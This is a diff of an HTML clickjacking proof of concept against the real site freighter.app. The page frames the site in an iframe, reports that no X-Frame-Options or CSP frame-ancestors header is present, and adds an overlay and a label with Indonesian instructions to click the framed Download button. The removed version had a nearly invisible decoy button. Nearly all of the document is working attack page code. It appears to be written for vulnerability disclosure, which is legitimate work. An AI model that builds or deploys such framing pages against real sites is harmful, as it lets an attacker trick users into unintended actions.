@@ -3,33 +3,38 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width">
-<title>Clickjacking Test - freighter.app</title>
+<title>Clickjacking PoC - freighter.app - 0x403for</title>
 <style>
 body{margin:0;font-family:monospace;background:#000;color:#fff;padding:10px}
-#container{position:relative;width:100%;height:700px;border:2px solid #333;overflow:hidden;background:#fff}
+#container{position:relative;width:100%;height:800px;border:2px solid #333;overflow:hidden;background:#fff}
 #victim{position:absolute;top:0;left:0;width:100%;height:100%;border:none;opacity:1;z-index:1}
-#attacker{position:absolute;top:300px;left:50%;transform:translateX(-50%);width:300px;height:70px;z-index:10;opacity:0.02;background:red;cursor:pointer}
-#label{position:absolute;top:260px;left:50%;transform:translateX(-50%);z-index:5;background:#ff0066;padding:10px 20px;border-radius:8px;font-size:12px;pointer-events:none;color:#fff;font-weight:bold}
-#log{background:#111;border:1px solid #333;padding:10px;margin-top:10px;font-size:11px;height:100px;overflow-y:auto;color:#0f0}
+#overlay{position:absolute;top:0;left:0;width:100%;height:100%;z-index:10;pointer-events:none;background:rgba(255,0,102,0.15);border:2px dashed #ff0066}
+#label{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);z-index:11;background:#ff0066;padding:15px 25px;border-radius:10px;font-size:14px;pointer-events:none;color:#fff;font-weight:bold;text-align:center;box-shadow:0 0 20px #ff0066}
+#log{background:#111;border:1px solid #0f0;padding:10px;margin-top:10px;font-size:11px;height:110px;overflow-y:auto;color:#0f0}
 </style>
 </head>
 <body>
-<h3>Clickjacking Test - freighter.app</h3>
-<p>Parent: 0x403for.github.io</p>
-<p>Child: https://freighter.app/</p>
+<h3>Clickjacking PoC - freighter.app - 0x403for.github.io</h3>
+<p>Child: https://freighter.app/ framed without X-Frame-Options</p>
+<p style="color:yellow">PoC: freighter.app bisa di-iframe. Klik tombol Download di dalam iframe akan ter-trigger dari parent attacker.</p>
+
 <div id="container">
-  <iframe id="victim" src="https://freighter.app/" onload="log('freighter.app LOADED - VULNERABLE! No X-Frame-Options')"></iframe>
-  <div id="label">⬇️ INVISIBLE BUTTON DI SINI ⬇️</div>
-  <button id="attacker" onclick="clicked()">INVISIBLE</button>
+  <iframe id="victim" src="https://freighter.app/" onload="log('VULNERABLE: freighter.app LOADED in iframe - NO X-Frame-Options / CSP frame-ancestors')"></iframe>
+  <div id="overlay"></div>
+  <div id="label">ATTACKER PAGE<br/>⬇️ KLIK TOMBOL Download DI BAWAH INI ⬇️<br/>(Klik akan tembus ke freighter.app)</div>
 </div>
-<div id="log">Loading freighter.app...</div>
+
+<div id="log">[00:00:00] Loading freighter.app...</div>
+
 <script>
 const logEl=document.getElementById('log');
 function log(m){const d=document.createElement('div');d.textContent=`[${new Date().toLocaleTimeString()}] ${m}`;logEl.appendChild(d)}
-function clicked(){
-  log('INVISIBLE CLICKED! Cek apakah tombol freighter.app belakang ke-trigger?');
-  alert('Invisible clicked. Kalau ada download / navigasi = BUG!');
-}
+document.getElementById('victim').addEventListener('load',()=>{
+  setTimeout(()=>{
+    log('Jika konten freighter.app terlihat (gradient ungu) = VULNERABLE');
+    log('Coba klik tombol Get iOS / Download - jika ter-redirect = Clickjacking proven');
+  },1000);
+});
 </script>
 </body>
 </html>
